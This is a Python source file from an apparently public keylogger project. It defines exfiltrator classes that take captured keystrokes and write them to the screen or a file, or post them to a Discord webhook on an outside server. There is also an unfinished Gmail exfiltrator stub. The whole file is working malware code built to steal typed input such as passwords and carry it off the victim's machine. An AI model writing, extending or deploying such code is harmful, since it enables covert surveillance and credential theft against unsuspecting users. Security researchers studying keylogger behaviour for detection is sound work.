#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import aiohttp
import asyncio
import logging
from pathlib import Path
from typing import Collection

from discord import Webhook, AsyncWebhookAdapter

import reporting
from keylogger import KeyLogger


class Exfiltrator(abc.ABC):
    def __init__(self, subject: KeyLogger, host_name: str):
        subject.register_exfiltrator(exfiltrator=self)
        self.host_name = f"Keylogger::{self.__class__.__name__}"
        if host_name is not None:
            self.host_name += f"::{host_name}"
        self.logger = reporting.set_logger(name=self.host_name)

    @abc.abstractmethod
    def update(self, *args, **kwargs):
        ...


class Screen(Exfiltrator):
    def __init__(self, *, subject: KeyLogger, host_name: str = None):
        super().__init__(subject, host_name)

    def update(self, data: Collection[str]):
        self.logger.info("".join(data) if len(data) > 0 else "<NO INPUT>")
        print(reporting.get_logs())


class TextFile(Exfiltrator):
    def __init__(self, *,
                 subject: KeyLogger,
                 host_name: str = None,
                 file_path: [str, Path]):
        super().__init__(subject, host_name)
        self.file_path = file_path

    def update(self, data: Collection[str]):
        if len(data) > 0:
            self.logger.info("".join(data))
            with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                file.write(reporting.get_logs())


class Gmail(Exfiltrator):
    def __init__(self, *, subject: KeyLogger, host_name: str = None):
        super().__init__(subject, host_name)

    def update(self, data: Collection[str]):
        ...


class Discord(Exfiltrator):
    def __init__(self, *,
                 subject: KeyLogger,
                 host_name: str = None,
                 webhook_url: str):
        super().__init__(subject, host_name)
        self.webhook_url = webhook_url
        # Prevent asyncio from spamming the server with DEBUG logging
        logging.getLogger("asyncio").setLevel(logging.CRITICAL)
        logging.getLogger("discord.webhook").setLevel(logging.CRITICAL)

    def update(self, data: Collection[str]) -> None:
        if len(data) > 0:
            self.logger.info("".join(data))
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            await webhook.send(content=reporting.get_logs(),
                               username=self.host_name)
